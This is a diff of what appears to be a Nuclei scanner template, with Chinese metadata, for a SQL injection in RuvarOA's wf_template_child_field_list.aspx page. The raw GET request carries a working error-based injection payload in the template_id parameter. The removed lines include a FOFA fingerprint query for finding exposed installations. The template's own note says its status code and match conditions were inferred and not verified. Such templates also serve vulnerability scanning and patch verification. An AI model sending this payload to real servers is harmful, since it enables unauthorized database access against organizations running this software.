@@ -3,14 +3,8 @@ info:
   name: RuvarOAwf_template_child_field_list存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/366cc5c20b7a18add0cae1d5e0138b0d
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 366cc5c20b7a18add0cae1d5e0138b0d
-    fofa: + fofa`body="txt_admin_key"`
 http:
 - raw:
   - 'GET /SysManage/wf_template_child_field_list.aspx?template_id=1+AND+4582+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284582%3D4582%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29 HTTP/1.1
